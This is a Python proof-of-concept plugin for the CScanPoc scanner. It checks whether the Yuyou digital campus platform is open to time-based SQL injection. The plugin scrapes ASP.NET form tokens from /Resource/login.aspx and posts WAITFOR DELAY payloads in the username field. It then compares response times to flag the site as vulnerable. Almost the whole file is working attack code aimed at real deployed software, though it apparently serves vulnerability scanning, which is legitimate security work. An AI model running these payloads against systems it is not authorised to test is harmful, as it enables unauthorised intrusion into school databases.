# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import time

class Vuln(ABVuln):
    poc_id = '4ea8f872-bc98-480a-b7dd-166b135e2dab'
    name = '育友通用数字化校园平台 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-04-03'  # 漏洞公布时间
    desc = '''
        育友通用数字化校园平台 /Resource/login.aspx SQL注入漏洞：
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '育友通用数字化校园平台'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

def findVIEWSTATE(url):
    hh = hackhttp.hackhttp()
    m_values = []
    code, head, res, errcode, _ = hh.http(url)
    m1 = re.search("__VIEWSTATE.*?value=\"(.*?)\"", res, re.S)
    m2 = re.search("__EVENTVALIDATION.*?value=\"(.*?)\"", res, re.S)
    m_values.append(m1.group(1))
    m_values.append(m2.group(1))
    return m_values

class Poc(ABPoc):
    poc_id = '3cf0996f-aa4b-4c0b-8266-dcf6749545f4'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            #refer:http://www.wooyun.org/bugs/wooyun-2010-0105448
            hh = hackhttp.hackhttp()
            payload = '/Resource/login.aspx'
            url = self.target + payload 
            viewstate_value=findVIEWSTATE(url)
            postdata1 = '__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE='+viewstate_value[0]+'&Login1:txtUserName=%27%20%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--&Login1:txtPassword=1&Login1:ImageButton1.x=1&Login1:ImageButton1.y=1&__EVENTVALIDATION='+viewstate_value[1]
            postdata2 = '__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE='+viewstate_value[0]+'&Login1:txtUserName=%27%20%3BWAITFOR%20DELAY%20%270%3A0%3A1%27--&Login1:txtPassword=1&Login1:ImageButton1.x=1&Login1:ImageButton1.y=1&__EVENTVALIDATION='+viewstate_value[1]
            t1 = time.time()
            code1, head, res1, errcode, _ = hh.http(url, postdata1)
            t2 = time.time()
            code2, head, res2, errcode, _ = hh.http(url, postdata2)
            t3 = time.time()
            if (t2 - t1 - t3 + t2 > 3):
                #security_hole(arg+payload)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
